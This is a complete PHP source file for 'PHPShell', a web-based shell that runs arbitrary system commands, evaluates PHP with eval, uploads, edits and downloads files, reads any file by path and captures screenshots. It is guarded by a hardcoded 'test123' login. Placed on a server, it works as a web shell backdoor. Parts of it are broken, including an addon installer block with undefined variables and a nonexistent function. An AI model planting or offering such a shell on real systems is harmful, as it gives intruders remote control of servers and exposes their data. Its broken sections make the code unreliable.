<?php
$ps_min=true;
$ps_path = __FILE__;
define('PHPSHELL_EOF_MARK','---EOF');
$REGISTERED_FUNCTIONS = array();
$GLOBALS['PC'] = array(
/*
* A MOTD to users
*/
'MOTD' => "",
/*
* If you know the real path to the php CLI executable, then specify it here,
* if you don't phpshell will try to guess it. The path to PHP is important
* for interactive-stdin support,
* but if php is in PATH env variable, then don't worry
*/
'PHP_PATH' => '',
/*
* Default mode for PHPShell to work in
* Possible values:
* shell_exec shell_exec will by used for executing commands
* This works as long as shell_exe isn't disabled.
* Downside is that interactive-stdin is not possible.
*
* interactive proc_open will be used together with some dark php
* magic to give a very rough interactive support
* through simple stdin pipes. tty programs will
* not work as expected, if at all.
*
*
*/
'MODE' => 'interactive-stdin',
/*
* Prompt layout:
* possible variables:
* %cwd% Current working directory
* %hostname% Hostname
* %user% The user running phpshell
*/
'WIN_PROMPT' => '%cwd%> ', //Classic DOS style
'NIX_PROMPT' => '%user%@%hostname%:%cwd% #',
/*
* HTTP AUTHENTICATION
* You might want to protect PHPShell with simple http authentication
*/
'USE_AUTH' => true,
'AUTH_USERNAME' => 'test123',
'AUTH_PASSWORD' => 'test123',
'ENV' => array(
'WIN' => array(),
'NIX' => array()
)
);
?>
<?php
$args=PS::getArgvAssoc();
function alt_auth(){
?>
<form method="POST">
<input type="password" name="psauth"><input type="submit" value="Enter" />
</form>
<?php
exit;
}
if(@$GLOBALS['PC']['USE_AUTH'] && !isset($args['cmd'])){
if(@$_POST['psauth'] == $GLOBALS['PC']['AUTH_PASSWORD']
|| @$_COOKIE['psauth'] == md5($GLOBALS['PC']['AUTH_PASSWORD'])){
setcookie('psauth', md5($GLOBALS['PC']['AUTH_PASSWORD']),time()+3600);
} else {
if (!isset($_SERVER['PHP_AUTH_USER'])) {
header('WWW-Authenticate: Basic realm="My Realm"');
header('HTTP/1.0 401 Unauthorized');
echo 'Authentication required.';
alt_auth();
exit;
}
if($_SERVER['PHP_AUTH_USER'] != @$GLOBALS['PC']['AUTH_USERNAME']
|| $_SERVER['PHP_AUTH_PW'] != @$GLOBALS['PC']['AUTH_PASSWORD'])
{
header('WWW-Authenticate: Basic realm="My Realm"');
header('HTTP/1.0 401 Unauthorized');
echo 'Authentication required.';
alt_auth();
exit;
}
}
}
/**
* Use this function to register functions in PHP as commands callable from the PHPShell.
*
* @param type $f callable to use for this command
* @param type $cmd command alias
* @param type $help Description to be listed in 'help' command
*/
function rC($f,$cmd,$help=''){
$GLOBALS['REGISTERED_FUNCTIONS'][$cmd] = array('function'=>$f,'help'=>$help);
}
class PS {
/**
* Initializes PHPShell client.
*/
public function __construct(){
@ob_clean();
$args=$this->getArgvAssoc();
/*
* Open a new process and keep it running even though
* Client disconnects. using ampersand to spawn a new thread on nix
* systems and by using start command on windows.
*/
if(isset($args['cmd'])){
print_r($args);
print_r($GLOBALS['argv']);
chdir(realpath($args['cwd']).DIRECTORY_SEPARATOR);
$this->spawnProcess($args['cmd'],$args['handle']);
exit;
}
/*
* If no CLI arguments are catched, we respond to client requests.
*/
if(isset($_POST['cwd'])){
chdir($_REQUEST['cwd']);
}
if(isset($_POST['action'])){
switch($_POST['action']){
case 'exec':
$this->runCommand($_POST['cmd'],@$_POST['mode']);
break;
case 'suggest':
$this->tabSuggest($_POST['input']);
break;
case 'proc':
$this->readProc($_POST['handle']);
break;
case 'stdin':
$this->stdinToProc($_POST['stdin'],$_POST['handle']);
break;
default:
echo json_encode(array('error' => 'Unknown action.'));
break;
}
} else {
$__CSS = $GLOBALS['__CSS'];
$__JS = $GLOBALS['__JS'];
$__PC = $GLOBALS['PC'];
unset($__PC['AUTH_USERNAME']);
unset($__PC['AUTH_PASSWORD']);
?><!DOCTYPE html>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>PHPShell</title>
<script type="text/javascript" src="http://code.jquery.com/jquery-2.0.3.min.js"></script>
<script type="text/javascript">
var SI = <?php echo json_encode($this->getShellInfo());?>;
</script>
<script type="text/javascript">
<?php   ?>var PHPShell = {};
(function(phpshell){
$(function(){
var input = '';
var history = [];
try {
history = JSON.parse(localStorage.getItem('hist')) || [];
} catch(e){}
var currentHistory = 0;
var $pre = $('<pre>');
$('body > *').each(function(){
$(this).remove();
});
var mode = localStorage.getItem('ps_xmode') || SI.mode || 'exec';
var supportedModes = ['interactive','shell_exec','exec'];
var onCommandListeners = [];
$('body').append($pre);
var $output = $('<span class="output"></span>');
$pre.append($output);
var $input = $('<input class="input">');
$pre.append($input);
$('body').append($('<div class="bg"></div>'));
$input.focus();
$input.css('min-width','100px');
/**
* Input buffer for stdin stuff
* @type Array
*/
var procStdIn = [];
/**
* UUID for current running process
* @type Boolean|Boolean|@exp;response@pro;handle
*/
var currentHandle = false;
/**
* Current suggestions
* @type Array|Array|@exp;data@pro;suggestions
*/
var suggestions = [];
/**
* Current suggestion index
* @type Number|Number|Number
*/
var currentSuggestion = 0;
/**
* Previous keystroke
* @type Number|Number|@exp;e@pro;which
*/
var lastKey = 0;
var echoKeyboard = true;
/**
*
*/
$input.keyup(function(e){
if(currentHandle != false){
var strIn = $input.val();
if(strIn.length > 0){
procStdIn.push(strIn);
$input.val('');
}
if(e.which == 13||e.which==10){
procStdIn.push(String.fromCharCode(10));
}
sendStdIn();
}
});
$input.keydown(function(e){
if(currentHandle != false){
return;
}
switch(e.which){
case 9:
if(lastKey != 9){
suggestions = [];
$.ajax(window.location.href,{
async: true,
dataType: 'json',
type:'post',
data:{
action:'suggest',
cwd:SI.cwd,
input:$input.val()
}
}).done(function(data){
suggestions = data.suggestions;
$input.val(suggestions[currentSuggestion]);
$input.css('width',12+($input.val().length*12));
});
currentSuggestion = 0;
} else if(suggestions.length > 0) {
currentSuggestion++;
if(currentSuggestion >= suggestions.length) currentSuggestion = 0;
else $input.val(suggestions[currentSuggestion]);
$input.val(suggestions[currentSuggestion]);
$input.css('width',12+($input.val().length*12));
}
lastKey = 9;
e.preventDefault();
return false;
break;
case 38:
currentHistory++;
if(currentHistory > history.length){
currentHistory = 0;
$input.val('');
} else {
$input.val('');
setTimeout(function(){
$input.val(history[history.length-currentHistory]);
$input.css('width',12+($input.val().length*12));
},50);
}
break;
case 40:
currentHistory--;
if(history < 0){
history = 0;
$input.val('');
} else
$input.val(history[history.length-currentHistory]);
break;
case 13:
runStatement();
break;
default: console.log(e.which);
break;
}
lastKey = e.which;
$input.css('width',12+($input.val().length*12));
});
function animateCursor(){
$("html, body").stop();
$("html, body").animate({ scrollTop: $(document).height() }, 2500);
}
function write(s){
$output.append(s);
}
function writeln(s){
$output.append(s+'\n');
}
function writeCwdLine(){
var cwdStr = SI.prompt_style;
var cwdVars = {
cwd : SI.cwd,
hostname : SI.hostname,
user : SI.user
};
$.each(cwdVars,function(i){
cwdStr = cwdStr.replace('%'+i+'%',this);
});
write('\n<span class="cwd">'+cwdStr+'</span>');
}
function readProc(){
$.post(window.location.href,{action:'proc',handle:currentHandle,cwd:SI.cwd}, function(response){
if(response.out !== "")
write(response.out);
if(!response.eof){
readProc();
} else {
currentHandle = false;
writeCwdLine();
}
animateCursor();
},"json").error(function(){
readProc();
});
}
function sendStdIn(){
if(currentHandle && procStdIn.length > 0){
if(echoKeyboard)
$.each(procStdIn,function(i){
write(this);
});
$.post(window.location.href,{stdin:procStdIn,handle:currentHandle,action:'stdin'},function(){
});
procStdIn = [];
}
}
function runStatement(){
var statement = $input.val();
if(history[history.length-1] !== statement){
history.push(statement);
localStorage.setItem('hist', JSON.stringify(history));
}
currentHistory = 0;
$input.val('');
writeln(statement);
/*
* Client side commands
*/
if(statement == "clear" || statement == "cls"){
$output.html('');
writeCwdLine();
return;
}
var stopPropagation = false;
$(onCommandListeners).each(function(){
if(this.call(phpshell,statement) === false){
stopPropagation = true;
return false;
}
});
if(stopPropagation){
console.log('preventdefault');
writeCwdLine();
return false;
}
var setMode = statement.match(/^xsetmode *([a-z-_]*)/);
if(setMode && setMode.length == 2){
if($.inArray(setMode[1],supportedModes) > -1){
mode = setMode[1];
writeln('PHPShell mode set to '+mode);
localStorage.setItem('ps_xmode', mode);
} else {
writeln('"'+setMode[1]+'" is not a valid option.\nSupported modes: '+supportedModes.join(', ')
+ "\nCurrent mode: "+mode);
}
writeCwdLine();
return;
}
var xecho = statement.match(/xecho (true|false|0|1|on|off)/);
if(xecho){
if($.inArray(xecho[1],['true','on','1']) > -1){
echoKeyboard = true;
writeln('Keyboard echo enabled.');
} else {
echoKeyboard = false;
writeln('Keyboard echo disabled.');
}
writeCwdLine();
return;
}
$.post(window.location.href,{action:'exec',cwd:SI.cwd,cmd:statement,mode:mode},function(response){
if(mode == "interactive" && response.handle){
currentHandle = response.handle;
procStdIn = [];
readProc();
} else {
write(response.html ? response.output : document.createTextNode(response.output));
SI.cwd = response.cwd;
writeCwdLine();
animateCursor();
}
},"JSON").error(function(r){ write(r.responseText); writeCwdLine(); });
}
phpshell.onCommand = function(callback){
onCommandListeners.push(callback);
};
phpshell.writeln = writeln;
phpshell.write = write;
phpshell.writeCwdLine = writeCwdLine;
writeln(SI.motd);
writeCwdLine();
});
})(PHPShell);
<?php ?>
<?php echo @$GLOBALS['__JS']; ?>
</script>
<style>
<?php echo @$GLOBALS['__CSS']; ?>
.input {
border:none;
outline-width: 0;
font-family: monospace;
font-size:12px;
padding:0px;
margin:0px;
}
</style>
</head>
<body>
</body>
</html>
<?php
}
exit;
}
private $proc;
private $pipes;
private $handle;
/**
* Starts a command as an async proc. that will run forever.
* This is done by calling phpshell from within a shell to create a worker thread
* that can feed the client with output and feed the process with client input.
* @param type $cmd
*/
private function startAsyncProc($cmd){
$handle = md5($cmd.time());
$this->handle = $handle;
file_put_contents($this->getTmpFile('stdout'), '');
$args = array(
'handle' => $handle,
'cmd' => $cmd,
'cwd' => getcwd()
);
$c = //PHP executable path
$this->getPhpPath()." "
. $GLOBALS['ps_path']
. self::arrayToArgs($args);
echo json_encode(array('handle'=>$handle,'cwd'=>getcwd()));
chdir(dirname($GLOBALS['ps_path']));
if(PS::iW()){
pclose(popen("start /MIN $c", "r"));
} else {
shell_exec("nohup $c > /dev/null 2>/dev/null &");
}
return $handle;
}
private static function arrayToArgs($arrArgs){
$str = '';
foreach($arrArgs as $k => $v){
$v = escapeshellarg($v);
$str .= " -$k $v";
}
return $str;
}
/**
* Attempts to find the path to the PHP executable on the system.
*
* @return type
*/
private function getPhpPath(){
$pathTests = array();
$cachedResultFile = dirname(__FILE__).DIRECTORY_SEPARATOR.'phpshell-phpbin-path';
if(isset($GLOBALS['PC']['PHP_PATH'])
&& file_exists($GLOBALS['PC']['PHP_PATH'])){
return $GLOBALS['PC']['PHP_PATH'];
}
$cachedPhpPath = @file_get_contents($cachedResultFile);
if($cachedPhpPath){
return $cachedPhpPath;
} else {
if(PS::iW()){
$pathTests = array(
'php',
'c:\php\php.exe',
'c:\php5\php.exe',
'c:\xampp\php\php.exe',
'c:\wamp\php\php.exe',
'c:\program files\php\php.exe'
);
} else {
$pathTests = array(
'php',
'php-cli',
'/bin/php',
'/bin/php-cli',
'/usr/bin/php',
'/usr/bin/php-cli',
'/Applications/MAMP/php/php',
);
}
foreach($pathTests as $p){
$r = shell_exec($p.' -v');
if($r){
file_put_contents($cachedResultFile, $p);
return $p;
}
}
}
file_put_contents($this->getTmpFile('stdout'), "\nERROR: Could not find php executable.".
"\nIf you now where it is you can specify it in phpshell-config.php or with the xphppath command\n".
PHPSHELL_EOF_MARK);
return 'php';
}
/**
* Sends stdin to the stdin tempfile
* STDIN does not work reliably on proc_open so it is essentially unused
* @param type $stdin
* @param type $proc
*/
private function stdinToProc($stdin,$handle){
$this->handle = $handle;
$stdinStr = str_replace("\r", "\n", $stdin);
file_put_contents($this->getTmpFile('stdin'), $stdinStr,FILE_APPEND);
}
/**
* Gets argv with simple "windows" like syntax
* my-cli.php -stringInput 'this is a string' -int 10 -boolean_flag -another
* returns:
* array('stringInput' => 'this is a string', 'int'=>10,'boolean_flag'=>true,'another'=>true)
* @global type $argv
*/
public static function getArgvAssoc(){
global $argv,$argc;
$arguments = array();
for($i=0; $i < $argc; $i++){
$nextIsArg = strpos($argv[$i+1],'-') === 0;
if(strpos($argv[$i],'-') === 0){
$arguments[trim($argv[$i],'-')] = (isset($argv[$i+1]) && !$nextIsArg)
? $argv[$i+1] : true;
if(!$nextIsArg) $i++;
}
}
return $arguments;
}
/**
* Return the full path to the specified tempfile.
* @param type $pipe
* @return type
*/
private function getTmpFile($pipe){
return dirname(__FILE__).DIRECTORY_SEPARATOR.$this->handle.'-'.$pipe;
}
/**
* Spawns a new process in that runs indefinetely and pipe output to a tempfile.
* @param type $cmd
*/
private function spawnProcess($cmd,$handle){
$this->handle = $handle;
file_put_contents($this->getTmpFile('stdout'), '');
file_put_contents($this->getTmpFile('stdin'),'');
$descriptors = array(
0 => array("pipe", "r"),
1 => array("file", $this->getTmpFile('stdout'),"a"), // stdout is a pipe that the child will write to
2 => array("file", $this->getTmpFile('stdout'),"a"), // stderr is a file to write to
);
foreach($GLOBALS['PC'][self::iW()?'WIN':'NIX']['ENV'] as $k => $env){
putenv("$k=$env");
}
$this->proc = proc_open($cmd, $descriptors, $this->pipes, getcwd());
//usleep(250000);
$pinfo = proc_get_status($this->proc);
$terminate = false;
while($pinfo['running']){
echo '.';
//first clear statcache if long enough time has passed since the last stat
if(time() - filemtime($this->getTmpFile('stdin')) > 60){
clearstatcache(true, $this->getTmpFile('stdin'));
}
if(time() - filemtime($this->getTmpFile('stdin')) > 60){
$terminate = true;
break;
}
$stdin = @file_get_contents($this->getTmpFile('stdin'));
if($stdin !== '' && $stdin !== false){
file_put_contents($this->getTmpFile('stdin'),'');
fwrite($this->pipes[0],$stdin);
} else {
usleep(250000);
}
$pinfo = proc_get_status($this->proc);
}
proc_close($this->proc);
if(!$terminate){
file_put_contents($this->getTmpFile('stdout'),PHPSHELL_EOF_MARK,FILE_APPEND);
sleep(1);
}
@unlink($this->getTmpFile('stdout'));
@unlink($this->getTmpFile('stdin'));
}
/**
* reads the stdout tempfile and returns the result as json to the client.
* @param type $handle
*/
public function readProc($handle){
$this->handle = $handle;
$data = "";
$eof = false;
$touchCounter = 0;
while($data === ""){
$data = @file_get_contents($this->getTmpFile('stdout'));
if($data)
file_put_contents($this->getTmpFile('stdout'), '');
usleep (500000);
//to the process running that the client is still alive.
if($touchCounter == 0){
$touchCounter = 30;
touch($this->getTmpFile('stdin'));
}
$touchCounter--;
}
if(strpos($data, PHPSHELL_EOF_MARK) !== false){
$data = str_replace(PHPSHELL_EOF_MARK,'',$data);
@unlink($this->getTmpFile('stdout'));
@unlink($this->getTmpFile('stdin'));
$eof=true;
}
$detectedEncoding = mb_detect_encoding($data,mb_list_encodings(),true);
if($detectedEncoding != 'UTF-8'){
$data = iconv($detectedEncoding, 'UTF-8//TRANSLIT//IGNORE', $data);
}
echo json_encode(array('out' => htmlentities($data,null,'UTF-8'),'eof'=>$eof));
}
public static function strToArgv($str, $keepQuotes=false){
preg_match_all("#\"[^\"]+\"|'[^']+'|[^ ]++#", $str, $args);
$argv = array();
foreach($args[0] as $arg){
$argv[] = $keepQuotes ? $arg : str_replace(array('"',"'"), '', $arg);
}
return $argv;
}
/**
* Run a command be it internal or shell executed
* @param type $cmd
* @param type $mode proc
*
*/
private function runCommand($cmd,$mode="shell_exec"){
$output = $this->processInternalCommand($cmd);
if($output === null){
if($mode=="shell_exec" || !$mode){
$output = shell_exec($_REQUEST['cmd'].' 2>&1');
} elseif($mode=="exec") {
$return = -1;
$output = "";
exec($_REQUEST['cmd'].' 2>&1', $output, $return);
$output = implode($output,"\n");
} elseif($mode == "interactive") {
$this->startAsyncProc($cmd);
exit;
}
} else {
$html = true;
}
$detectedEncoding = mb_detect_encoding($output, mb_list_encodings(),true);
if($detectedEncoding != 'UTF-8'){
$output = iconv($detectedEncoding, 'UTF-8//TRANSLIT//IGNORE', $output);
}
echo json_encode(array(
'output' => $output,
'html' => $html,
'cwd' => getcwd()
));
exit;
}
/**
* Handles suggestion when hitting [TAB] key in the client.
* @param type $input
*/
private function tabSuggest($i){
$suggestions = array();
$input = self::strToArgv($i);
$cmd = '';
if(count($input) > 1){
$search = $input[count($input)-1];
unset($input[count($input)-1]);
$cmd = implode(' ',$input).' ';
} else {
$search = $input[0];
if(preg_match("#[ ]$#", $i)){
$search = '';
$cmd = $input[0].' ';
}
}
foreach(glob($search.'*') as $f){
if(is_dir($f)) $f .= DIRECTORY_SEPARATOR;
if(strpos($f,' ') !== false) $f = '"'.$f.'"';
$suggestions[] = $cmd.$f;
}
$suggestions[] = $i;
echo json_encode(array('suggestions'=>$suggestions));
exit;
}
/**
* Checks if a command is an internal one, executes it if it is, returns null
* if it isnt.
* @global array $REGISTERED_FUNCTIONS
* @param type $statement
* @return type
*/
private function processInternalCommand($statement){
global $REGISTERED_FUNCTIONS;
$statement = explode(' ', $statement,2);
$cmd = $statement[0];
$args = @$statement[1];
if(isset($REGISTERED_FUNCTIONS[$cmd])){
ob_start();
$commandFunc = $REGISTERED_FUNCTIONS[$cmd]['function'];
$commandFunc($args);
return ob_get_clean();
}
return null;
}
/**
* Return information about the shell to the client.
* Current working dir, prompt format, motd.
* @return type
*/
private function getShellInfo(){
return array(
'cwd' => getcwd(),
'motd' => $this->getMotd(),
'user' => function_exists('posix_getlogin')
? posix_getlogin()
: (
(function_exists('shell_exec') && PS::iW())
? trim(shell_exec('echo %USERNAME%'))
: '?'
),
'mode' => $GLOBALS['PC']['MODE'],
'hostname' => function_exists('gethostname') ? gethostname() : 'unknown-host',
'prompt_style' => $GLOBALS['PC'][PS::iW()?'WIN_PROMPT':'NIX_PROMPT']
);
}
/**
* Return the MOTD for the shell.
* @return string
*/
private function getMotd(){
$motd = 'PHP-Shell - '.php_uname();
if(isset($GLOBALS['PC']['MOTD']))
$motd .= "\n\n".$GLOBALS['PC']['MOTD']."\n";
$motd .= "\nEnter 'help' to get started.";
return $motd;
}
/**
* Returns true if OS is WIN else false and *NIX is assumed.
* @return type
*/
public static function iW(){
return strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
}
}
?>
<?php
function ps_cd($args){
$args = PS::strToArgv($args);
$args = $args[0];
if(file_exists($args))
chdir($args);
elseif(file_exists(getcwd().'/'.$args))
chdir(getcwd().'/'.$args);
echo 'Changed directory to: '.getcwd();
}
rC('ps_cd','cd','Change directory');
function ps_wget($args){
$args = PS::strToArgv($args);
if(isset($args[0]) && filter_var($args[0],FILTER_VALIDATE_URL) !== FALSE){
$filename = $args[1] ? $args[1] : pathinfo($args[0],PATHINFO_FILENAME);
echo "Downloading: $args[0]...\n";
file_put_contents($filename, file_get_contents($args[0]));
echo "Saved download as '$filename'\n";
} else echo "Invalid url\n";
}
rC('ps_wget','dl','Download file \'dl source dest\'');
function ps_eval($args){
if(preg_match('#;|echo\b|print[ (]|return#', $args))
eval($args);
else
var_dump(eval("return $args;"));
}
rC('ps_eval','eval','PHP eval()');
function ps_help($args){
foreach($GLOBALS['REGISTERED_FUNCTIONS'] as $cmd => $info){
echo str_pad($cmd, 25);
echo $info['help'];
echo "\n";
}
}
rC('ps_help','help','The command you just called');
function ps_lc($args){
echo count(file($args));
}
if(PS::iW())
rC('ps_lc','lc','line count');
function _ls_formatbytes($bytes, $precision = 2) {
$units = array('B ', 'KB', 'MB', 'GB', 'TB');
$bytes = max($bytes, 0);
$pow = floor(($bytes ? log($bytes) : 0) / log(1024));
$pow = min($pow, count($units) - 1);
$bytes /= pow(1024, $pow);
return round($bytes, $precision) . ' ' . $units[$pow];
}
function ps_ls($ls){
foreach(glob($ls ? $ls : '*') as $file){
echo str_pad(
is_dir($file)
? '--DIR--'
: _ls_formatbytes(filesize($file)),10,' ',STR_PAD_LEFT)
. " " . $file . "\n";
}
}
if(PS::iW())
rC('ps_ls','ls','List directory content');
else
rC('ps_ls','list','List directory content');
function ps_build_util($args){
$args = PS::strToArgv($args);
$replace = in_array('--replace', $args);
$keep = in_array('--keep', $args);
$addons = array();
$without = in_array('without', $args);
$with = in_array('with', $args);
$dest = false;
foreach($args as $a){
if(preg_match("#^--dest=(.+)#", $a, $dest)){
$dest = $dest[1];
}
}
if($replace && $GLOBALS['ps_min']){
$dest = $GLOBALS['ps_path'];
}
if(count($args) < 2 || !($keep || $dest)){
echo "\nYou must at least specify all addons or include / exclude and either --keep, --replace or --dest. --replace and --dest will only keep gz comp if it can";
echo "\nExamples: ";
echo "\nqpk rebuild with cd ls qedit qget qput qpk --replace #Replace current phpshell with light custom version";
echo "\nqpk rebuild without qpk screenprint txttoart --keep #Keep build folder and build a semi bloated version without qpk, screenprint and txttoart";
echo "\nqpk rebuild all --dest=/move/build/here #build with all addons and move build files to dest";
exit;
}
$build_dir = "build_phpshell/php-shell-master";
$addon_dir = "$build_dir/addons";
copy('https://github.com/EJTH/php-shell/archive/master.zip','ps_master.zip');
_unzip('ps_master.zip', 'build_phpshell/');
if(file_exists('build_phpshell/')){
echo "\nBuilding...\n";
foreach(glob("$addon_dir/*.php") as $a){
$a = pathinfo($a, PATHINFO_FILENAME);
$in_list = in_array($a, $args);
if(($without && $in_list) || ($with && !$in_list)){
unlink("$addon_dir/$a.php");
} else {
$addons[] = $a;
}
}
if(in_array('all', $args)) $addons = "all";
echo "Building with addons: " . implode(", ",$addons);
file_put_contents("$build_dir/phpshell-config.php",'<?php $GLOBALS[\'PC\'] = json_decode(\'' . json_encode($GLOBALS['PC']) . '\',true);?>');
passthru("cd $build_dir/ && rm -f phpshell-min.php phpshell-min-gz.php && php phpshell-build.php && echo Succesfully build");
passthru('pwd');
if($dest){
copy("$build_dir/phpshell-min.php", $dest);
}
if(!$keep){
echo "removing build dir";
passthru("rm -rf build_phpshell");
}
unlink('ps_master.zip');
}
}
function _unzip($s,$d){
$zip = new ZipArchive;
$res = $zip->open($s);
if ($res === TRUE) {
$zip->extractTo($d);
$zip->close();
return true;
}
}
rC('ps_build_util','qbuild','Rebuild with addons');
?>
<?php   
function ps_qedit($args){
echo '<div class="qedit" data-file="'.htmlentities($args).'"><textarea>'.@str_replace(['<','>'],['&lt;','&gt;'],file_get_contents(realpath($args))).'</textarea><button class="save">Save</button></div>';
}
if(isset($_POST['qedit_content']) && isset($_POST['qedit_fn'])){
echo file_put_contents($_POST['qedit_fn'],$_POST['qedit_content']);
}
rC('ps_qedit','qedit','Edit various data files. supported: txt');
?>
<?php   
$addon_path = $GLOBALS['ps_path'] . '/addons/';
$addon = "https://raw.githubusercontent.com/EJTH/php-shell/master/addons/$addon.php";
if(file_exists($addon_path)){
error_level(E_ALL);
if( copy($addon,$addon_path . $args[1]) ){
echo "Installed $addon";
}
echo "Failed to install $addon";
} else {
echo "No addon folder found. Please create writeable directory at $addon_path";
}
rC('ps_qpk','qpk','Manage addons (list | install | remove)');
?>
<?php   
function ps_qput($args){
echo '<iframe src="?qputfrm=1&cwd='. urlencode($_POST['cwd']) .'"><iframe>';
}
function ps_qput_frm(){
echo '<form method="post" enctype="multipart/form-data"><input type="hidden" name="cwd" value"'.htmlentities($_GET['cwd']).'" /><input onchange="this.parentNode.submit();" type="file" name="qput" /></form>';
}
if(isset($_FILES['qput'])){
move_uploaded_file($_FILES['qput']['tmp_name'], $_FILES['qput']['name']);
}
if(isset($_GET['qputfrm'])){
ps_qput_frm();
exit;
}
rC('ps_qput','qput','Put file(s)');
?>
<?php   
function ps_qwget($args){
$args = PS::strToArgv($args);
if(count($args) == 0){
echo "Usage: qwget URL [FILE]";
} else {
$http_handle = fopen($args[0], "r");
$fn = isset($args[1]) ? $args[1]
: pathinfo($args[1], PATHINFO_BASENAME);
$file_handle = fopen($fn, 'w');
if($http_handle === FALSE) echo "Failed to get url: " + $args[0];
if($file_handle === FALSE) echo "Failed to get create file: " + $args[1];
while (!feof($http_handle)) {
echo ".";
fwrite($file_handle, fread($http_handle, 512));
}
echo "Downloaded file to: $fn";
fclose($file_handle);
}
}
if(isset($_POST['qedit_content']) && isset($_POST['qedit_fn'])){
echo file_put_contents($_POST['qedit_fn'],$_POST['qedit_content']);
}
rC('ps_qwget','qwget','When you need curl or wget, but neither are there.');
?>
<?php
function ps_prntscrn($args){
echo '<img src="?printscreen='.time().'" alt="[LOADING SCREENSHOT]" style="max-width:80%" />';
}
if(isset($_GET['printscreen'])){
$im = imagegrabscreen();
imagepng($im);
}
if(PS::iW())
rC('ps_prntscrn','prntscrn','Print screenshot to shell');
function ps_tail($args){
$data = file($args);
if(!$data){
echo 'Could not open file:'.$args;
return;
}
$modifier = array();
$lc = 25;
if(preg_match("#-n ([0-9]+)#", $args, $modifier)){
$lc = $modifier[1];
}
$count = count($data);
for($i=max($count-$lc,0);$i<$count;$i++){
echo str_pad($i+1,5).htmlentities($data[$i]);
}
}
if(PS::iW())
rC('ps_tail','tail','Get last lines from file (-n [lc])');
function ps_txt2art($i,$ret=false){
$args = PS::strToArgv($i);
$str = utf8_decode($args[0]);
$font = @$args[1] ? $args[1] : 5;
$imW = strlen($str)* imagefontwidth($font);
$imH = imagefontheight($font);
$im = imagecreate($imW,$imH);
$bg = imagecolorallocate($im, 255, 255, 255);
$textcolor = imagecolorallocate($im, 0, 0, 0);
$char = @$args[2] ? $args[2] : '#';
$bgChar = @$args[3] ? $args[3] : ' ';
imagestring($im, $font, 0, 0, $str, $textcolor);
$out = '';
for($y = 0; $y<$imH; $y++){
for($x = 0; $x < $imW; $x++){
$out .= (imagecolorat($im, $x, $y) == $textcolor) ? $char: $bgChar;
}
$out .= "\n";
}
echo $out;
if($ret)return $out;
if(file_put_contents('txt2art.out',$out)){
echo "\nSaved to: txt2art.out";
}
}
rC('ps_txt2art','txt2art','String to "ascii-art"');
function ps_view($args){
if(file_exists($args)){
$ext = pathinfo($args,PATHINFO_EXTENSION);
switch($ext){
case 'jpg':
case 'jpeg':
case 'png':
case 'bmp':
case 'gif':
$info = getimagesize($args);
echo '<img src="?view_img='.urlencode(realpath($args)).'" style="max-width:80%" />';
echo "\n$info[mime] ($info[0] x $info[1])";
break;
default:
$lines = file($args);
foreach($lines as $l => $s){
echo str_pad($l+1,8).htmlentities($s);
}
break;
}
}
}
if(isset($_GET['view_img'])){
echo file_get_contents($_GET['view_img']);
}
rC('ps_view','view','View various data files. supported: jpeg, png, bmp, gif, txt, php');
$GLOBALS['__JS'] = <<<JSHERE
\$(function(){
PHPShell.onCommand(function(statement){
if(statement.match(/^help/)){
\$([
'Client commands:',
'xsetmode shell_exec | interactive',
'xecho on | off',
'help',
'',
'PHP commands:'
]).each(function(){
PHPShell.writeln(this);
});
}
});
})
\$(function(){
\$(document).on('click','.qedit .save', function(e){
var \$editor = \$(this.parentNode);
\$.post(window.location.href,{
qedit_content : \$editor.find('textarea').val(),
qedit_fn : \$editor.data('file')
}, function(){
\$editor.replaceWith('Saved');
});
});
})
JSHERE;
$GLOBALS['__CSS'] = <<<CSSHERE
.cwd {
color: red;
}
body,.input {
text-shadow: 2px 2px #000;
color:#eee;
}
html,body {
margin:0px;
padding:0px;
}
.qedit {
}
.qedit textarea {
display:block;
width: 90%;
min-height: 300px;
opacity: 0.2;
}
.bg {
background: #45484d;
background: -moz-linear-gradient(top, #45484d 0%, #000000 100%);
background: -webkit-gradient(linear, left top, left bottom, color-stop(0%,#45484d), color-stop(100%,#000000));
background: -webkit-linear-gradient(top, #45484d 0%,#000000 100%);
background: -o-linear-gradient(top, #45484d 0%,#000000 100%);
background: -ms-linear-gradient(top, #45484d 0%,#000000 100%);
background: linear-gradient(to bottom, #45484d 0%,#000000 100%);
filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#45484d', endColorstr='#000000',GradientType=0 );
position:fixed;
width:100%;
height:100%;
top:0px;
z-index:1;
}
pre {
z-index:2;
position:relative;
padding:16px;
}
.input {
background:transparent;
}
a {
color:#fff;
}
CSSHERE;
$GLOBALS['phpshell'] = new PS(); ?>